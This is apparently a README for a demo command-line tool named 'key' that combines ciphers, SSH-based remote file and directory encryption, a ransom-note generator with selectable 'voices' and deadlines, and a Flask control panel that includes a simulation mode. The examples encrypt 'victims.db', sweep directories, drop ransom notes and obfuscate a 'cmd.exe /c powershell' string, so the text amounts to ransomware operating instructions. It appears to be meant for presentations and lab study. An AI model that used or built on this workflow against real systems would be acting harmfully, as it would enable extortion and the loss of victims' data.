# Usage

## Command Shape

- From a shell:
  ```bash
  key <cipher> <method> [options]
  ```
- Inside the keyconsole (after running `key`), omit the leading `key`:
  ```text
  0xPo11 $ <cipher> <method> [options]
  ```

Methods:

- `-e` / `--encode`
- `-d` / `--decode`
- `-b` / `--brute`

Input and output are always flags, never bare words:

```bash
key cc -e -t "secret" -k 3
key rn -e -i victims.db.enc -k "hunter2" -tm press -o NOTE.txt
```

A bare positional path is rejected because it is usually a mistyped `--local-out` path.

## Layered Chains

Add `+` between stages. The left stage receives the next stage:

```bash
key cc -e -t "payload" -k 3 + b64 -e
key xor -e -t "cmd.exe /c powershell" -k "A"
```

## File Encryption (`fe`)

Every path defaults to remote when `--host` is used. Use explicit locality flags:

- `--local-in`: input path exists on this machine.
- `--local-out`: output path exists on this machine.
- `--host`: remote operation endpoint.

Examples:

```bash
# local
key fe -e -i victims.db -k "hunter2" -o victims.db.enc
key fe -d -i victims.db.enc -k "hunter2" -o victims.db.restored

# remote
key fe -e --host deploy@10.0.0.5 -i /data/db.dump -k "hunter2" --local-out -o db.enc
key fe -d --host deploy@10.0.0.5 --local-in -i db.enc -o /data/db.dump -k "hunter2"
```

Do not combine `--local-out` and the path into `--local-out db.enc`.
Use `--local-out -o db.enc`.

Directory sweep:

```bash
key fe -e -i ./folder -k "hunter2"
key fe -e --host deploy@10.0.0.5 -i /data -k "hunter2"
```

## Ransom Notes (`rn`)

Template voices are `generic`, `polite`, and `press`.

```bash
key rn -e -i victims.db.enc -k "hunter2" -tm press -o NOTE.txt
key rn -e -tm polite -dl 24
```

`rn` can also write to a custom destination:

```bash
key fe -e -i victims.db -k "hunter2" --drop-note press --note-out /tmp/NOTE.txt
```

A dropped note is displayed automatically after encryption.

## Help

```bash
help              # top-level console help
help fe           # per-cipher usage
key cc -h         # same menu outside the console
```

## Presentation Demo

```bash
./setup_local_ssh.sh
./demo.sh
```

Restore local SSH state afterward:

```bash
pkill -f "sshd -f /tmp/ssh/sshd_config"
mv ~/.ssh/config.bak ~/.ssh/config
```

## Web UI Control Panel

A Flask dashboard wraps the `key` CLI for presentation use:

```bash
python3 control_panel.py
# open http://127.0.0.1:8765/
```

The panel serves six views:

- **Overview** — stats, chips, quick actions, command helper
- **Cipher Library** — all 30 local-first ciphers
- **File Encryption** — `fe` encrypt/decrypt with `-i`, `-o`, `-k`, `--host`, `--local-in`, `--local-out`, `--drop-note`
- **Ransom Note** — `rn` template generator (`generic`, `polite`, `press`)
- **Remote Host** — `fe --host` SSH streaming with timeout and locality flags
- **Terminal** — run arbitrary `key <cipher> ...` commands

Each view has a **Simulation mode** checkbox. When checked, the panel renders the command that would run without executing it, so you can step through the chain on a projector without touching files. Uncheck it to actually execute against lab test data.

All commands run through the installed `key` binary via subprocess. Nothing is installed on remote machines; `--host` uses the system `ssh` transport only.
